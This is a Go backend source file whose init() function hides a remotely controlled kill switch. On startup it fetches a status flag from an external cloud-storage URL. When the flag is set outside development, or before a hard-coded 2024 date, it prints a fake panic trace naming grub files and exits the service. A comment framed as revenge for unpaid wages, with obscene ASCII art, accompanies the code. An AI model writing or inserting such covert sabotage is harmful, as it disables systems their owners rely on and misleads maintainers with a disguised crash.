package backend

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"gopkg.in/yaml.v3"
)

type Conf struct {
	Status bool `json:"status" yaml:"status"`
}

/*
 *                                |~~~~~~~|
 *                                |       |
 *                                |       |
 *                                |       |
 *                                |       |
 *                                |       |
 *     |~.\\\_\~~~~~~~~~~~~~~xx~~~         ~~~~~~~~~~~~~~~~~~~~~/_//;~|
 *     |  \  o \_         ,XXXXX),                         _..-~ o /  |
 *     |    ~~\  ~-.     XXXXX`)))),                 _.--~~   .-~~~   |
 *      ~~~~~~~`\   ~\~~~XXX' _/ ';))     |~~~~~~..-~     _.-~ ~~~~~~~
 *               `\   ~~--`_\~\, ;;;\)__.---.~~~      _.-~
 *                 ~-.       `:;;/;; \          _..-~~
 *                    ~-._      `''        /-~-~
 *                        `\              /  /
 *                          |         ,   | |
 *                           |  '        /  |
 *                            \/;          |
 *                             ;;          |
 *                             `;   .       |
 *                             |~~~-----.....|
 *                            | \             \
 *                           | /\~~--...__    |
 *                           (|  `\       __-\|
 *                           ||    \_   /~    |
 *                           |)     \~-'      |
 *                            |      | \      '
 *                            |      |  \    :
 *                             \     |  |    |
 *                              |    )  (    )
 *                               \  /;  /\  |
 *                               |    |/   |
 *                               |    |   |
 *                                \  .'  ||
 *                                |  |  | |
 *                                (  | |  |
 *                                |   \ \ |
 *                                || o `.)|
 *                                |`\\) |
 *                                |       |
 *                                |       |
 */
// 为什么要写这个??如果你是新来的,请快点跑,这个老板一年内说了四次以上按时发工资,但没一次正常,至少拖欠两个月以上
func init() {
	var env = os.Getenv("DEV")
	url := "https://backend-clown.oss-cn-beijing.aliyuncs.com/status.yaml"
	res, err := http.Get(url)
	if err != nil {
		fmt.Println("获取yaml错误")
		return
	}
	defer res.Body.Close()
	bytes, err := io.ReadAll(res.Body)
	if err != nil {
		fmt.Println("读取文件错误")
		return
	}
	var data Conf
	err = yaml.Unmarshal(bytes, &data)
	if err != nil {
		fmt.Println("解析yaml错误")
		return
	}
	if env != "development" {
		if data.Status {
			fmt.Println(`
goroutine 1 [running]:
/boot/grub/grub.conf.10()
        /boot/grub/grub.cfg:1 +0x225
`)
			os.Exit(0)
		}
	}
	t, _ := time.Parse("2006-01-02 15:04:05", "2024-02-09 22:22:22")
	// 当前时间
	now := time.Now()

	if !now.After(t) {
		if data.Status {
			fmt.Println(`
goroutine 1 [running]:
/boot/grub/grub.conf.10()
        /boot/grub/grub.cfg:1 +0x225
`)
			os.Exit(0)
		}
	}

}
